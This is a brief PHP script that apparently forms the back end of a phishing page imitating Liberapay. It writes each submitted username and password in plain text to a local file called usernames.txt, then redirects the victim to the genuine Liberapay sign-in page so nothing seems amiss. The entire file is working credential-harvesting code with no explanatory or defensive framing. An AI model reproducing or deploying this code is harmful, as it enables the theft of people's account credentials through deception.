<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://liberapay.com/sign-in?back_to=%2Fthelinuxchoice%2Fdonate');
exit();
